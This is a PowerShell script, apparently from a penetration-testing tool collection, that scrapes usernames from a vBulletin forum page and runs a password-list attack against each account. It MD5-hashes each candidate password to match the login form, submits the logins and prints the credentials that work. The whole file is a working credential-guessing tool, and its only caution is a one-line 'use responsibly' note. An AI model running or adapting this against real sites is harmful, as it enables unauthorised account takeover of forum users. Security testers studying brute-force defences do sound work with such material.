

    <#
    .SYNOPSIS
    Script to scrape a target site and then attempt a Password List attack against discovered content.
 
    .DESCRIPTION
    Visit site, scrape by regex the user names based on a provided regex. 
    Attempt login and then based on another REGEX determin if the login was succesful or not.
 
    .NOTES
    Before you use this script, you will need to examine your test target and modify this script to target the specific sites implementation, even if it is a vBulletin forum.

    This, you should be able to do for yourself. 

    Please use responsibly.
 
    .LINK
    https://github.com/andrewbuckley/PenTestTools
    http://www.thinkingsecure.com.au/
    https://twitter.com/@LuroonTol

    .PARAMETER URI
    Target URI that includes the list of users you want to scrape. In this example this also includes the AUthentication form.
    .PARAMETER REGEX
    the regex that filters only the data that contains usernames. Format should include a named group called users that will contain the required users names
    E.G. '(?:.html">)(?<users>.+?)(?:</A>)'
    .PARAMETER REGEX2
    Something that is only in a failed response. REGEX 
    E.G. "Invalid"
    .PARAMETER PASSFILE
    The file containing your passwords, one per line.

    #>


[CmdletBinding()]
Param(
    #DEFINE the following Params.... 

    #URI for forum
    [Parameter(Mandatory=$True)]
    [string]$URI = 'http://www.targeturl.com/forum/',

    #define the regex that filters only the data that is required
    [Parameter(Mandatory=$True)]
    [string]$REGEX = '(?:.html">)(?<users>.+?)(?:</A>)', #updated regex for a specifc vBulletin implementation , TODO clean it up and exclude strong later. 

    #what am is needed looking in a failed login
    [Parameter(Mandatory=$True)]
    [string]$REGEX2 = '(?<response>Invalid)',

    [Parameter(Mandatory=$True)]
    [string]$PASSFILE    
 

)

#Define some globals

#websession where will keep our session information.
$WEBSESSION =$null
#User Agent. Some sites require this to not be Powershell. This is IE on Windows 8
$USERAGENT = 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MDDRJS)'

#Load passwords file....
$PASSWORDS = Get-Content -Path $PASSFILE # 's:\poc\passwords.txt' 

#Begin by grabbing the requested page at URI.
$WEBREQUEST = Invoke-WebRequest -Uri $URI -SessionVariable WEBSESSION -UserAgent $USERAGENT

#Get the HTML for the page you know contains your target users list.
$HTML = $WEBREQUEST.ParsedHtml.Body.InnerHTML

#grab the users to a variable
$USERS = select-string -InputObject $HTML -Pattern $REGEX -Allmatches | % {$_.Matches}  | % {$_.Groups["users"].Value} 

#create the form to submit to the application. 
$FORM = $WEBREQUEST.Forms[1]

#ADD REQUIRED fields to the form
$Form.Fields.ADD('vb_login_username','')

if($Form.Fields.Remove('navbar_username')){ '' }#hack. wrap it in an if and do nothing... either way code goes on.

#Backup initial Session Just incase
$BAC_WEBSESSION = $WEBSESSION

#Loop through discovered users
ForEach ($USER in $USERS) 
{
    #loop through passwords in the Passwords file
    ForEach ($PASSWORD in $PASSWORDS)
    {
        
        #load untainted cookies..
        $WEBSESSION = $BAC_WEBSESSION 
        

        #fill form fields. And customise for this specific Site. 
        $Form.Fields['vb_login_username']=$USER
        $FORM.Fields['s']=''
        
        #because vBulletin is what it is, it only sends MD5's of the password... So, calculate and send..
        #MD5 Password. Put into appropriate form fields, password should be blank.
        #create the .net crypto object
        $HASHER = new-object System.Security.Cryptography.MD5CryptoServiceProvider

        #create the encoding object and convert the password.
        $ENC = [system.Text.Encoding]::UTF8
        $UTFPASSWORD = $ENC.GetBytes($PASSWORD) 

        # Now hash 
        $HASH = $HASHER.ComputeHash($UTFPASSWORD)

        #convert our hash to a string, remove unwanted seperator characters.
        $CLEANHASH = (([System.BitConverter]::ToString($HASH)).Replace('-','')).ToLower()
        
        #Assign hash to variables that need the value.
        $FORM.Fields['vb_login_md5password'] = $CLEANHASH
        $FORM.Fields['vb_login_md5password_utf'] = $CLEANHASH

        #The RIGHT WAY TO SUBMIT THIS REQUEST. But in powershell 3 unable to configure the REFERER... So See below for PowerSHell 2 version of streaming post data etc, and streaming hte response.
        #Invoke-WebRequest -Uri $FORM.Action -WebSession $WEBSESSION -Method Post -Body $FORM.Fields -ContentType 'application/x-www-form-urlencoded'

        #.NET Powershell 2 method for streaming post data and response data.
        
        #Create the webrequest
        [System.Net.HttpWebRequest] $WEBLOGIN = [System.Net.WebRequest]::Create( $FORM.Action )
        

        # build the headers, 
        $WEBLOGIN.Referer = $FORM.Action
        
        #build the cookies. 
        $WEBLOGIN.Headers.Add('Cookie', $WEBSESSION.Cookies.GetCookieHeader($URI) )

        #Configure the rest of the request
        $WEBLOGIN.Method = $FORM.Method
        $WEBLOGIN.ContentType = "application/x-www-form-urlencoded"
        $WEBLOGIN.Timeout = 1000
        $WEBLOGIN.UserAgent = $USERAGENT
        $WEBLOGIN.Accept = 'text/html, application/xhtml+xml, */*'
        $WEBLOGIN.Headers.Add('Pragma', 'no-cache')
        #$WEBLOGIN.Headers.Add('Accept-Encoding','gzip, deflate')
        $WEBLOGIN.Headers.Add('Accept-Language','en-AU,en;q=0.5')
        $WEBLOGIN.Headers.Add('DNT','1')

        #Body for completed Form.
        #BUILD DATA in appropriate format. And encode.
        #POST_DATA is going to store our Form data. 
        $POST_DATA = $null
        
        #Grab my variables from the POWERSHELL 3 form object and build them into the $POST_DATA Variable
        $FORM.Fields.GetEnumerator() | ForEach-Object { $POST_DATA = $POST_DATA + $_.Key + '=' + $_.Value + '&'  } 
        
        #Do chosen encoding.
        $BUFFER = [System.Text.Encoding]::UTF8.GetBytes($POST_DATA)
        $WEBLOGIN.ContentLength = $BUFFER.Length;

        #Stream the POST DATA... Go .NET...
        $REQUESTSTREAM = $WEBLOGIN.GetRequestStream()
        $REQUESTSTREAM.Write($BUFFER, 0, $BUFFER.Length)
        $REQUESTSTREAM.Flush()
        $REQUESTSTREAM.Close()
        
        #Harness the powers of .net to send the login to catch the websites resonse to my streamed POST request.
        [System.Net.HttpWebResponse] $WEBRESPONSE = $WEBLOGIN.GetResponse()
        #Build a stream reader for outputting the websites response to the request.
        $STREAMREADER = New-Object System.IO.StreamReader($WEBRESPONSE.GetResponseStream())
        #Put the response into the $Response variable
        $RESPONSE = $STREAMREADER.ReadToEnd()
        
        # read hte response looking for the message advising login had been succesfull. 
        Write-Host 'Valid Credentials'
        #Look in response, check for if it contains a string that matches the $REGEX2 value the login failed, if it does not contain the string, write it out
        IF( $RESPONSE.ToString() -NotMatch $REGEX2 ) { Write-Host $USER ':' $PASSWORD }

    }
}